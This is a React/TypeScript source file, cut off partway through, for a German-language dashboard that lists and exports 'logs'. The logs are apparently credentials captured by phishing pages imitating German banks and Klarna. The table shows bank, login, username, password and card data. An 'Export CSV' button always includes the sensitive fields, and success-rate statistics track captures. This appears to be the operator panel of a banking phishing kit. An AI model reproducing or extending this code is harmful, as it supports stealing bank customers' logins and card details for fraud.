import React, { useState, useEffect, useMemo } from 'react';
import { 
  Mail, 
  Phone, 
  Calendar, 
  FileText, 
  Loader, 
  AlertTriangle, 
  Search, 
  Filter, 
  Download, 
  Eye,
  Clock,
  Users,
  TrendingUp,
  Shield,
  Trash2,
  Copy,
  User,
  Key,
  CreditCard,
  AlertCircle,
  ChevronLeft,
  ChevronRight
} from 'lucide-react';
import { useNavigate } from 'react-router-dom';
import { BankIcon } from '../utils/bankIcons';
import Pagination from '../components/Pagination';

interface Lead {
  id: number;
  name: string | null;
  email: string | null;
  phone: string | null;
  username: string | null;
  template_name: string;
  domain_name: string;
  status: string;
  created_at: string;
  additional_data?: string;
}

interface LeadsResponse {
  leads: Lead[];
  pagination: {
    total: number;
    page: number;
    limit: number;
    totalPages: number;
  };
}

export const Leads: React.FC = () => {
  const navigate = useNavigate();

  // Preload bank icons when component mounts
  useEffect(() => {
    import('../utils/imagePreloader').then(({ preloadCriticalImages }) => {
      preloadCriticalImages();
    });
  }, []);
  const [leads, setLeads] = useState<Lead[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [realStats, setRealStats] = useState<any>(null);
  const [currentPage, setCurrentPage] = useState(1);
  const [totalPages, setTotalPages] = useState(1);
  const [totalLeads, setTotalLeads] = useState(0);
  const [pageSize, setPageSize] = useState(50); // Items per page
  
  // Filter and search states
  const [searchTerm, setSearchTerm] = useState('');
  const [selectedTemplate, setSelectedTemplate] = useState('');
  const [selectedStatus, setSelectedStatus] = useState('');
  const [dateRange, setDateRange] = useState('all');
  const [showFilters, setShowFilters] = useState(false);
  const [isExporting, setIsExporting] = useState(false);
  const [deletingId, setDeletingId] = useState<number | null>(null);
  
  // Bulk selection states
  const [selectedLeads, setSelectedLeads] = useState<Set<number>>(new Set());
  const [isSelectAll, setIsSelectAll] = useState(false);
  const [bulkOperation, setBulkOperation] = useState<'delete' | 'update-status' | 'export' | null>(null);
  const [bulkStatus, setBulkStatus] = useState('contacted');

  // Fetch leads from API
  // Fetch real statistics
  useEffect(() => {
    const fetchStatistics = async () => {
      try {
        const token = localStorage.getItem('token');
        if (!token) return;

        const response = await fetch('/api/leads/statistics', {
          headers: {
            'Authorization': `Bearer ${token}`,
            'Content-Type': 'application/json'
          }
        });

        if (response.ok) {
          const data = await response.json();
          setRealStats(data.statistics);
        }
      } catch (error) {
        console.error('Error fetching lead statistics:', error);
      }
    };

    fetchStatistics();
  }, []);

  useEffect(() => {
    const fetchLeads = async () => {
      try {
        setLoading(true);
        const token = localStorage.getItem('token');
        
        if (!token) {
          setError('Nicht authentifiziert');
          setLoading(false);
          return;
        }

        // Build query parameters
        const params = new URLSearchParams({
          page: currentPage.toString(),
          limit: pageSize.toString()
        });
        
        if (searchTerm.trim()) {
          params.append('search', searchTerm.trim());
        }
        if (selectedTemplate) {
          params.append('template_name', selectedTemplate);
        }
        if (selectedStatus) {
          params.append('status', selectedStatus);
        }
        if (dateRange !== 'all') {
          params.append('date_range', dateRange);
        }

        const response = await fetch(`/api/leads?${params.toString()}`, {
          headers: {
            'Authorization': `Bearer ${token}`,
            'Content-Type': 'application/json'
          }
        });

        if (!response.ok) {
          throw new Error('Fehler beim Laden der Leads');
        }

        const data: LeadsResponse = await response.json();
        setLeads(data.leads);
        setTotalPages(data.pagination.totalPages);
        setTotalLeads(data.pagination.total);
        setError(null);
      } catch (err) {
        console.error('Error fetching leads:', err);
        setError(err instanceof Error ? err.message : 'Fehler beim Laden der Leads');
      } finally {
        setLoading(false);
      }
    };

    fetchLeads();
  }, [currentPage, pageSize, searchTerm, selectedTemplate, selectedStatus, dateRange]);

  // Handle page size change
  const handlePageSizeChange = (newPageSize: number) => {
    setPageSize(newPageSize);
    setCurrentPage(1); // Reset to first page when changing page size
  };

  // Reset to first page when filters change
  useEffect(() => {
    setCurrentPage(1);
  }, [searchTerm, selectedTemplate, selectedStatus, dateRange]);

  // Format display name
  const formatDisplayName = (lead: Lead) => {
    if (lead.name) return lead.name;
    if (lead.username) return lead.username;
    if (lead.email) return lead.email.split('@')[0];
    return 'Unbekannt';
  };

  // Format status
  const getStatusColor = (status: string) => {
    switch (status.toLowerCase()) {
      case 'completed':
        return 'bg-green-100 text-green-800';
      case 'new':
        return 'bg-red-100 text-red-800';
      case 'contacted':
        return 'bg-orange-100 text-orange-800';
      default:
        return 'bg-gray-100 text-gray-800';
    }
  };

  // Format German status text
  const getStatusText = (status: string) => {
    switch (status.toLowerCase()) {
      case 'completed':
        return 'Abgeschlossen';
      case 'new':
        return 'Neu';
      case 'contacted':
        return 'Kontaktiert';
      default:
        return status;
    }
  };

  // Get unique templates from leads
  const availableTemplates = useMemo(() => {
    const templates = [...new Set(leads.map(lead => lead.template_name))];
    return templates.sort();
  }, [leads]);

  // Use real statistics from API when available, fallback to page-based estimates
  const stats = useMemo(() => {
    if (realStats) {
      // Use accurate database counts
      return {
        total: realStats.total,
        completed: realStats.completed,
        new: realStats.new,
        contacted: realStats.contacted,
        partial: realStats.partial,
        withEmail: realStats.withEmail,
        withPhone: realStats.withPhone,
        conversionRate: realStats.conversionRate.toFixed(1)
      };
    }
    
    // Fallback to page-based estimates if real stats not loaded yet
    const total = totalLeads || leads.length;
    const completed = leads.filter(lead => lead.status.toLowerCase() === 'completed').length;
    const newLeads = leads.filter(lead => lead.status.toLowerCase() === 'new').length;
    const contacted = leads.filter(lead => lead.status.toLowerCase() === 'contacted').length;
    const partial = leads.filter(lead => lead.status.toLowerCase().includes('partial')).length;
    const withEmail = leads.filter(lead => lead.email).length;
    const withPhone = leads.filter(lead => lead.phone).length;
    
    return {
      total: total,
      completed: completed,
      new: newLeads,
      contacted: contacted,
      partial: partial,
      withEmail,
      withPhone,
      conversionRate: total > 0 ? ((completed / total) * 100).toFixed(1) : '0'
    };
  }, [leads, totalLeads, realStats]);

  // Copy to clipboard function
  const copyToClipboard = async (text: string, type: string) => {
    try {
      await navigator.clipboard.writeText(text);
      // You could add a toast notification here
      console.log(`${type} copied to clipboard:`, text);
    } catch (err) {
      console.error('Failed to copy:', err);
    }
  };

  // Get bank icon path for template
  const getBankIconPath = (templateName: string) => {
    const iconPaths: { [key: string]: string } = {
      'commerzbank': '/images/icons/commerzbank.png',
      'santander': '/images/icons/santander.png',
      'apobank': '/images/icons/apobank.png',
      'sparkasse': '/images/icons/sparkasse.png',
      'postbank': '/images/icons/postbank.png',
      'dkb': '/images/icons/dkb.png',
      'volksbank': '/images/icons/volksbank.png',
      'deutsche_bank': '/images/icons/deutschebank.png',
      'comdirect': '/images/icons/comdirect.png',
      'consorsbank': '/images/icons/Consorsbank.png',
      'ingdiba': '/images/icons/ingdiba.png',
      'klarna': '/images/icons/klarna.png',
      'credit-landing': '/images/icons/klarna.png'
    };
    
    return iconPaths[templateName] || null;
  };

  // Get bank icon for template (for filter dropdown)
  const getBankIcon = (templateName: string) => {
    const iconPath = getBankIconPath(templateName);
    if (iconPath) {
      return (
        <span className="inline-flex items-center justify-center w-5 h-5 rounded border border-gray-200 bg-white shadow-sm mr-2">
          <img 
            src={iconPath}
            alt={`${templateName} Logo`}
            className="h-3 w-3 object-contain"
            onError={(e) => {
              // Hide image and show fallback text if it fails to load
              const target = e.target as HTMLImageElement;
              target.style.display = 'none';
              const parent = target.parentElement;
              if (parent) {
                parent.innerHTML = '<span class="text-xs font-medium text-gray-500">' + templateName.charAt(0).toUpperCase() + '</span>';
              }
            }}
          />
        </span>
      );
    }
    return <span className="inline-flex items-center justify-center w-5 h-5 rounded border border-gray-200 bg-white shadow-sm mr-2 text-xs font-medium text-gray-500">{templateName.charAt(0).toUpperCase()}</span>;
  };

  // Handle filter changes
  const handleTemplateChange = (template: string) => {
    setSelectedTemplate(template);
  };

  const handleStatusChange = (status: string) => {
    setSelectedStatus(status);
  };

  const handleSearchChange = (search: string) => {
    setSearchTerm(search);
  };

  // Handle CSV export
  const handleExportCSV = async (includeSensitive: boolean = false) => {
    try {
      setIsExporting(true);
      const token = localStorage.getItem('token');
      if (!token) {
        setError('Nicht authentifiziert');
        return;
      }

      // Build export parameters based on current filters
      const params = new URLSearchParams();
      
      if (searchTerm.trim()) {
        params.append('search', searchTerm.trim());
      }
      if (selectedTemplate) {
        params.append('template_name', selectedTemplate);
      }
      if (selectedStatus) {
        params.append('status', selectedStatus);
      }
      if (dateRange !== 'all') {
        params.append('date_range', dateRange);
      }
      if (includeSensitive) {
        params.append('include_sensitive', 'true');
      }

      const response = await fetch(`/api/leads/export/csv?${params.toString()}`, {
        headers: {
          'Authorization': `Bearer ${token}`,
        }
      });

      if (!response.ok) {
        throw new Error('Fehler beim Exportieren der Daten');
      }

      // Get the filename from the response headers
      const contentDisposition = response.headers.get('Content-Disposition');
      const filename = contentDisposition
        ? contentDisposition.split('filename=')[1]?.replace(/"/g, '')
        : `banking-suite-logs-${new Date().toISOString().split('T')[0]}.csv`;

      // Create blob and download
      const blob = await response.blob();
      const url = window.URL.createObjectURL(blob);
      const link = document.createElement('a');
      link.href = url;
      link.download = filename;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
      window.URL.revokeObjectURL(url);

      console.log(`📊 CSV export downloaded: ${filename}`);
    } catch (error) {
      console.error('Error exporting CSV:', error);
      setError(error instanceof Error ? error.message : 'Fehler beim Exportieren');
    } finally {
      setIsExporting(false);
    }
  };

  // Handle delete lead
  const handleDeleteLead = async (leadId: number) => {
    if (!confirm('Sind Sie sicher, dass Sie diesen Log-Eintrag löschen möchten? Diese Aktion kann nicht rückgängig gemacht werden.')) {
      return;
    }

    try {
      setDeletingId(leadId);
      const token = localStorage.getItem('token');
      if (!token) {
        setError('Nicht authentifiziert');
        return;
      }

      const response = await fetch(`/api/leads/${leadId}`, {
        method: 'DELETE',
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json'
        }
      });

      if (!response.ok) {
        throw new Error('Fehler beim Löschen des Eintrags');
      }

      // Remove the lead from the local state
      setLeads(prevLeads => prevLeads.filter(lead => lead.id !== leadId));
      setTotalLeads(prev => prev - 1);
      
      console.log(`🗑️ Lead ${leadId} deleted successfully`);
    } catch (error) {
      console.error('Error deleting lead:', error);
      setError(error instanceof Error ? error.message : 'Fehler beim Löschen');
    } finally {
      setDeletingId(null);
    }
  };

  // Bulk selection handlers
  const handleSelectAll = () => {
    if (isSelectAll) {
      setSelectedLeads(new Set());
      setIsSelectAll(false);
    } else {
      setSelectedLeads(new Set(leads.map(lead => lead.id)));
      setIsSelectAll(true);
    }
  };

  const handleSelectLead = (leadId: number) => {
    const newSelected = new Set(selectedLeads);
    if (newSelected.has(leadId)) {
      newSelected.delete(leadId);
    } else {
      newSelected.add(leadId);
    }
    setSelectedLeads(newSelected);
    setIsSelectAll(newSelected.size === leads.length && leads.length > 0);
  };

  // Bulk operations
  const handleBulkDelete = async () => {
    if (selectedLeads.size === 0) return;
    
    if (!confirm(`Sind Sie sicher, dass Sie ${selectedLeads.size} Log-Einträge löschen möchten? Diese Aktion kann nicht rückgängig gemacht werden.`)) {
      return;
    }

    try {
      setBulkOperation('delete');
      const token = localStorage.getItem('token');
      if (!token) {
        setError('Nicht authentifiziert');
        return;
      }

      const response = await fetch('/api/leads/bulk/delete', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ lead_ids: Array.from(selectedLeads) })
      });

      if (!response.ok) {
        throw new Error('Fehler beim Löschen der Einträge');
      }

      const result = await response.json();
      
      // Remove deleted leads from local state
      setLeads(prevLeads => prevLeads.filter(lead => !selectedLeads.has(lead.id)));
      setTotalLeads(prev => prev - result.deleted_count);
      setSelectedLeads(new Set());
      setIsSelectAll(false);
      
      console.log(`🗑️ Bulk deleted ${result.deleted_count} leads`);
    } catch (error) {
      console.error('Error bulk deleting leads:', error);
      setError(error instanceof Error ? error.message : 'Fehler beim Löschen');
    } finally {
      setBulkOperation(null);
    }
  };

  const handleBulkUpdateStatus = async () => {
    if (selectedLeads.size === 0) return;

    try {
      setBulkOperation('update-status');
      const token = localStorage.getItem('token');
      if (!token) {
        setError('Nicht authentifiziert');
        return;
      }

      const response = await fetch('/api/leads/bulk/update-status', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ 
          lead_ids: Array.from(selectedLeads),
          status: bulkStatus 
        })
      });

      if (!response.ok) {
        throw new Error('Fehler beim Aktualisieren der Einträge');
      }

      const result = await response.json();
      
      // Update leads in local state
      setLeads(prevLeads => 
        prevLeads.map(lead => 
          selectedLeads.has(lead.id) 
            ? { ...lead, status: bulkStatus }
            : lead
        )
      );
      
      setSelectedLeads(new Set());
      setIsSelectAll(false);
      
      console.log(`✅ Bulk updated ${result.updated_count} leads to status: ${bulkStatus}`);
    } catch (error) {
      console.error('Error bulk updating leads:', error);
      setError(error instanceof Error ? error.message : 'Fehler beim Aktualisieren');
    } finally {
      setBulkOperation(null);
    }
  };

  const handleBulkExport = async () => {
    if (selectedLeads.size === 0) return;

    try {
      setBulkOperation('export');
      const token = localStorage.getItem('token');
      if (!token) {
        setError('Nicht authentifiziert');
        return;
      }

      const response = await fetch('/api/leads/bulk/export', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ 
          lead_ids: Array.from(selectedLeads),
          include_sensitive: true 
        })
      });

      if (!response.ok) {
        throw new Error('Fehler beim Exportieren der ausgewählten Einträge');
      }

      // Get the filename from the response headers
      const contentDisposition = response.headers.get('Content-Disposition');
      const filename = contentDisposition
        ? contentDisposition.split('filename=')[1]?.replace(/"/g, '')
        : `banking-suite-selected-logs-${new Date().toISOString().split('T')[0]}.csv`;

      // Create blob and download
      const blob = await response.blob();
      const url = window.URL.createObjectURL(blob);
      const link = document.createElement('a');
      link.href = url;
      link.download = filename;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
      window.URL.revokeObjectURL(url);

      console.log(`📊 Bulk CSV export downloaded: ${filename} (${selectedLeads.size} selected records)`);
      setSelectedLeads(new Set());
      setIsSelectAll(false);
    } catch (error) {
      console.error('Error bulk exporting leads:', error);
      setError(error instanceof Error ? error.message : 'Fehler beim Exportieren');
    } finally {
      setBulkOperation(null);
    }
  };

  // Clear selection when leads change (due to filtering)
  useEffect(() => {
    setSelectedLeads(new Set());
    setIsSelectAll(false);
  }, [searchTerm, selectedTemplate, selectedStatus, dateRange]);

  if (loading) {
    return (
      <div className="flex justify-center items-center h-64">
        <Loader className="h-8 w-8 text-red-600 animate-spin" />
        <span className="ml-2 text-gray-600">Lade Logs...</span>
      </div>
    );
  }

  if (error) {
    return (
      <div className="bg-red-50 border border-red-200 rounded-lg p-4 text-red-700 flex items-center">
        <AlertTriangle className="h-5 w-5 mr-2" />
        {error}
      </div>
    );
  }

  return (
    <div className="space-y-6">
      {/* Header Section */}
      <div className="flex flex-col lg:flex-row lg:justify-between lg:items-center space-y-4 lg:space-y-0">
        <div>
          <h1 className="text-3xl font-bold text-gray-900">Logs</h1>
          <p className="text-sm text-gray-500 mt-1">
            Verwalten Sie alle erfassten Daten und Aktivitäten
          </p>
          {!loading && totalLeads > 0 && (
            <div className="flex items-center gap-4 mt-2">
              <span className="text-xs text-gray-400">
                Seite {currentPage} von {totalPages} • {pageSize} pro Seite • {totalLeads} gesamt
                {leads.length > 0 && (
                  <span className="ml-2">
                    (Angezeigt: {new Date(leads[leads.length - 1]?.created_at).toLocaleDateString('de-DE')} - {new Date(leads[0]?.created_at).toLocaleDateString('de-DE')})
                  </span>
                )}
              </span>
              {totalPages > 1 && (
                <div className="flex items-center gap-1">
                  <button
                    onClick={() => setCurrentPage(Math.max(1, currentPage - 1))}
                    disabled={currentPage === 1 || loading}
                    className="p-1 text-gray-400 hover:text-gray-600 disabled:opacity-50 disabled:cursor-not-allowed"
                    title="Vorherige Seite"
                  >
                    <ChevronLeft size={16} />
                  </button>
                  <button
                    onClick={() => setCurrentPage(Math.min(totalPages, currentPage + 1))}
                    disabled={currentPage === totalPages || loading}
                    className="p-1 text-gray-400 hover:text-gray-600 disabled:opacity-50 disabled:cursor-not-allowed"
                    title="Nächste Seite"
                  >
                    <ChevronRight size={16} />
                  </button>
                  <button
                    onClick={() => handlePageSizeChange(100)}
                    className="ml-2 px-2 py-1 text-xs bg-blue-100 text-blue-700 rounded hover:bg-blue-200"
                    title="Mehr anzeigen um ältere Logs zu finden"
                  >
                    100 pro Seite
                  </button>
                  <button
                    onClick={() => {
                      setSearchTerm('02.11.2025');
                      setCurrentPage(1);
                    }}
                    className="ml-1 px-2 py-1 text-xs bg-yellow-100 text-yellow-700 rounded hover:bg-yellow-200"
                    title="Suche nach Logs vom 02.11.2025"
                  >
                    Suche 02.11
                  </button>
                </div>
              )}
            </div>
          )}
        </div>
        <div className="flex flex-col sm:flex-row space-y-2 sm:space-y-0 sm:space-x-3">
          <button
            onClick={() => setShowFilters(!showFilters)}
            className={`inline-flex items-center px-4 py-2 border border-gray-300 rounded-md shadow-sm text-sm font-medium transition-colors ${
              showFilters 
                ? 'bg-red-50 text-red-700 border-red-300' 
                : 'bg-white text-gray-700 hover:bg-gray-50'
            }`}
          >
            <Filter className="h-4 w-4 mr-2" />
            Filter {showFilters ? 'ausblenden' : 'anzeigen'}
          </button>
          <button 
            onClick={() => {
              console.log('Export button clicked - starting full export');
              handleExportCSV(true); // Always export with ALL sensitive data
            }}
            disabled={isExporting}
            className="inline-flex items-center px-4 py-2 border border-gray-300 rounded-md shadow-sm text-sm font-medium text-gray-700 bg-white hover:bg-gray-50 disabled:opacity-50 disabled:cursor-not-allowed"
          >
            {isExporting ? (
              <Loader className="h-4 w-4 mr-2 animate-spin" />
            ) : (
              <Download className="h-4 w-4 mr-2" />
            )}
            {isExporting ? 'Exportiere...' : 'Export CSV'}
          </button>
        </div>
      </div>

      {/* Statistics Cards */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-5 gap-6">
        <div className="bg-white rounded-lg shadow p-6">
          <div className="flex items-center">
            <div className="p-3 bg-red-100 rounded-full">
              <Users className="h-6 w-6 text-red-600" />
            </div>
            <div className="ml-4">
              <h2 className="text-sm font-medium text-gray-500">Gesamt Einträge</h2>
              <p className="text-2xl font-semibold text-gray-900">{stats.total}</p>
            </div>
          </div>
        </div>

        <div className="bg-white rounded-lg shadow p-6">
          <div className="flex items-center">
            <div className="p-3 bg-green-100 rounded-full">
              <Shield className="h-6 w-6 text-green-600" />
            </div>
            <div className="ml-4">
              <h2 className="text-sm font-medium text-gray-500">Abgeschlossen</h2>
              <p className="text-2xl font-semibold text-gray-900">{stats.completed}</p>
            </div>
          </div>
        </div>

        <div className="bg-white rounded-lg shadow p-6">
          <div className="flex items-center">
            <div className="p-3 bg-blue-100 rounded-full">
              <TrendingUp className="h-6 w-6 text-blue-600" />
            </div>
            <div className="ml-4">
              <h2 className="text-sm font-medium text-gray-500">Erfolgsrate</h2>
              <p className="text-2xl font-semibold text-gray-900">{stats.conversionRate}%</p>
            </div>
          </div>
        </div>

        <div className="bg-white rounded-lg shadow p-6">
          <div className="flex items-center">
            <div className="p-3 bg-orange-100 rounded-full">
              <Clock className="h-6 w-6 text-orange-600" />
            </div>
            <div className="ml-4">
              <h2 className="text-sm font-medium text-gray-500">Neue Einträge</h2>
              <p className="text-2xl font-semibold text-gray-900">{stats.new}</p>
            </div>
          </div>
        </div>

        <div className="bg-white rounded-lg shadow p-6">
          <div className="flex items-center">
            <div className="p-3 bg-yellow-100 rounded-full">
              <AlertCircle className="h-6 w-6 text-yellow-600" />
            </div>
            <div className="ml-4">
              <h2 className="text-sm font-medium text-gray-500">Unvollständig</h2>
              <p className="text-2xl font-semibold text-gray-900">{stats.partial}</p>
              <p className="text-xs text-gray-400">Teilweise Daten</p>
            </div>
          </div>
        </div>
      </div>

      {/* Filters Section */}
      {showFilters && (
        <div className="bg-white rounded-lg shadow p-6">
          <h3 className="text-lg font-medium text-gray-900 mb-4">Filter & Suche</h3>
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
            {/* Search */}
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">Suche</label>
              <div className="relative">
                <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-gray-400" />
                <input
                  type="text"
                  placeholder="Name, E-Mail, Username..."
                  value={searchTerm}
                  onChange={(e) => handleSearchChange(e.target.value)}
                  className="w-full pl-10 pr-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-red-500 focus:border-red-500 text-sm"
                />
              </div>
            </div>

            {/* Bank Template Filter */}
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">Bank</label>
              <select
                value={selectedTemplate}
                onChange={(e) => handleTemplateChange(e.target.value)}
                className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-red-500 focus:border-red-500 text-sm bg-white hover:border-gray-400 transition-colors"
              >
                <option value="">Alle Templates</option>
                {availableTemplates.map(template => (
                  <option key={template} value={template}>
                    {template.charAt(0).toUpperCase() + template.slice(1)}
                  </option>
                ))}
              </select>
            </div>

            {/* Status Filter */}
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">Status</label>
              <select
                value={selectedStatus}
                onChange={(e) => handleStatusChange(e.target.value)}
                className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-red-500 focus:border-red-500 text-sm bg-white hover:border-gray-400 transition-colors"
              >
                <option value="">Alle Status</option>
                <option value="new">Neu</option>
                <option value="contacted">Kontaktiert</option>
                <option value="completed">Abgeschlossen</option>
              </select>
            </div>

            {/* Date Range Filter */}
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">Zeitraum</label>
              <select
                value={dateRange}
                onChange={(e) => setDateRange(e.target.value)}
                className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-red-500 focus:border-red-500 text-sm bg-white hover:border-gray-400 transition-colors"
              >
                <option value="all">Alle Zeiten</option>
                <option value="today">Heute</option>
                <option value="week">Diese Woche</option>
                <option value="month">Dieser Monat</option>
                <option value="quarter">Dieses Quartal</option>
              </select>
            </div>
          </div>

          {/* Active Filters Display */}
          {(searchTerm || selectedTemplate || selectedStatus || dateRange !== 'all') && (
            <div className="mt-4 pt-4 border-t border-gray-200">
              <div className="flex flex-wrap gap-2">
                <span className="text-sm text-gray-500">Aktive Filter:</span>
                {searchTerm && (
                  <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-red-100 text-red-800">
                    Suche: "{searchTerm}"
                    <button onClick={() => handleSearchChange('')} className="ml-1 text-red-600 hover:text-red-800">×</button>
                  </span>
                )}
                {selectedTemplate && (
                  <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-blue-100 text-blue-800">
                    {getBankIcon(selectedTemplate)} {selectedTemplate}
                    <button onClick={() => handleTemplateChange('')} className="ml-1 text-blue-600 hover:text-blue-800">×</button>
                  </span>
                )}
                {selectedStatus && (
                  <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-green-100 text-green-800">
                    Status: {getStatusText(selectedStatus)}
                    <button onClick={() => handleStatusChange('')} className="ml-1 text-green-600 hover:text-green-800">×</button>
                  </span>
                )}
                {dateRange !== 'all' && (
                  <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-purple-100 text-purple-800">
                    Zeitraum: {dateRange}
                    <button onClick={() => setDateRange('all')} className="ml-1 text-purple-600 hover:text-purple-800">×</button>
                  </span>
                )}
              </div>
            </div>
          )}
        </div>
      )}

      {/* Bulk Actions Bar */}
      {selectedLeads.size > 0 && (
        <div className="bg-white border border-gray-200 rounded-lg p-4 shadow-sm">
          <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between space-y-3 sm:space-y-0">
            <div className="flex items-center space-x-4">
              <span className="text-sm font-medium text-gray-900">
                {selectedLeads.size} {selectedLeads.size === 1 ? 'Eintrag' : 'Einträge'} ausgewählt
              </span>
              <button
                onClick={() => {
                  setSelectedLeads(new Set());
                  setIsSelectAll(false);
                }}
                className="text-sm text-gray-500 hover:text-gray-700"
              >
                Auswahl aufheben
              </button>
            </div>
            
            <div className="flex flex-col sm:flex-row space-y-2 sm:space-y-0 sm:space-x-3">
              {/* Status Update */}
              <div className="flex items-center space-x-2">
                <select
                  value={bulkStatus}
                  onChange={(e) => setBulkStatus(e.target.value)}
                  className="px-3 py-1.5 border border-gray-300 rounded-md text-sm focus:ring-red-500 focus:border-red-500"
                >
                  <option value="new">Neu</option>
                  <option value="contacted">Kontaktiert</option>
                  <option value="completed">Abgeschlossen</option>
                  <option value="cancelled">Abgebrochen</option>
                </select>
                <button
                  onClick={handleBulkUpdateStatus}
                  disabled={bulkOperation === 'update-status'}
                  className="inline-flex items-center px-3 py-1.5 border border-transparent text-sm font-medium rounded-md text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 disabled:opacity-50"
                >
                  {bulkOperation === 'update-status' ? (
                    <Loader className="h-4 w-4 mr-1 animate-spin" />
                  ) : null}
                  Status ändern
                </button>
              </div>

              {/* Export Selected */}
              <button
                onClick={handleBulkExport}
                disabled={bulkOperation === 'export'}
                className="inline-flex items-center px-3 py-1.5 border border-gray-300 rounded-md text-sm font-medium text-gray-700 bg-white hover:bg-gray-50 disabled:opacity-50"
              >
                {bulkOperation === 'export' ? (
                  <Loader className="h-4 w-4 mr-1 animate-spin" />
                ) : (
                  <Download className="h-4 w-4 mr-1" />
                )}
                Ausgewählte exportieren
              </button>

              {/* Delete Selected */}
              <button
                onClick={handleBulkDelete}
                disabled={bulkOperation === 'delete'}
                className="inline-flex items-center px-3 py-1.5 border border-transparent text-sm font-medium rounded-md text-white bg-red-600 hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-red-500 disabled:opacity-50"
              >
                {bulkOperation === 'delete' ? (
                  <Loader className="h-4 w-4 mr-1 animate-spin" />
                ) : (
                  <Trash2 className="h-4 w-4 mr-1" />
                )}
                Ausgewählte löschen
              </button>
            </div>
          </div>
        </div>
      )}

      <div className="bg-white shadow rounded-lg">
        <div className="overflow-x-auto">
          <table className="min-w-full divide-y divide-gray-200">
            <thead className="bg-gray-50">
              <tr>
                <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider w-16">
                  <input
                    type="checkbox"
                    checked={isSelectAll}
                    onChange={handleSelectAll}
                    className="h-4 w-4 text-red-600 focus:ring-red-500 border-gray-300 rounded"
                  />
                </th>
                <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                  <div className="flex items-center space-x-1">
                    <Shield className="h-4 w-4" />
                    <span>BANK</span>
                  </div>
                </th>
                <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                  <div className="flex items-center space-x-1">
                    <Users className="h-4 w-4" />
                    <span>LOGIN</span>
                  </div>
                </th>
                <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                  <div className="flex items-center space-x-1">
                    <User className="h-4 w-4" />
                    <span>Username</span>
                  </div>
                </th>
                <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                  <div className="flex items-center space-x-1">
                    <Key className="h-4 w-4" />
                    <span>Password</span>
                  </div>
                </th>
                <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                  <div className="flex items-center space-x-1">
                    <CreditCard className="h-4 w-4" />
                    <span>Card Data</span>
                  </div>
                </th>
                <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                  <div className="flex items-center space-x-1">
                    <Clock className="h-4 w-4" />
                    <span>Status</span>
                  </div>
                </th>
                <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                  <div className="flex items-center space-x-1">
                    <Calendar className="h-4 w-4" />
                    <span>Erstellt am</span>
                  </div>
                </th>
                <th className="px-6 py-3 text-center text-xs font-medium text-gray-500 uppercase tracking-wider">
                  <div className="flex items-center justify-center space-x-1">
                    <Eye className="h-4 w-4" />
                    <span>Aktionen</span>
                  </div>
                </th>
              </tr>
            </thead>
            <tbody className="bg-white divide-y divide-gray-200">
              {leads.length === 0 ? (
                <tr>
                  <td colSpan={9} className="px-6 py-12 text-center">
                    <div className="flex flex-col items-center">
                      <FileText className="h-12 w-12 text-gray-400 mb-4" />
                      <h3 className="text-sm font-medium text-gray-900 mb-2">Keine Einträge gefunden</h3>
                      <p className="text-sm text-gray-500">
                        {searchTerm || selectedTemplate || selectedStatus || dateRange !== 'all' 
                          ? 'Versuchen Sie, Ihre Filter zu ändern oder zu entfernen.'
                          : 'Es wurden noch keine Logs erfasst.'
                        }
                      </p>
                    </div>
                  </td>
                </tr>
              ) : (
                leads.map((lead) => (
                  <tr key={lead.id} className={`hover:bg-gray-50 transition-colors ${selectedLeads.has(lead.id) ? 'bg-red-50' : ''}`}>
                    <td className="px-6 py-4 w-16">
                      <input
                        type="checkbox"
                        checked={selectedLeads.has(lead.id)}
                        onChange={() => handleSelectLead(lead.id)}
                        className="h-4 w-4 text-red-600 focus:ring-red-500 border-gray-300 rounded"
                      />
                    </td>
                    <td className="px-6 py-4">
                      <div className="flex justify-center">
                        {(() => {
            // Extract selected bank for Klarna composite icons
            let selectedBank = null;
            if (lead.template_name === 'klarna') {
              if (lead.additional_data) {
              try {
                const additionalData = typeof lead.additional_data === 'string' 
                  ? JSON.parse(lead.additional_data) 
                  : lead.additional_data;
                // Try multiple possible locations for bank data
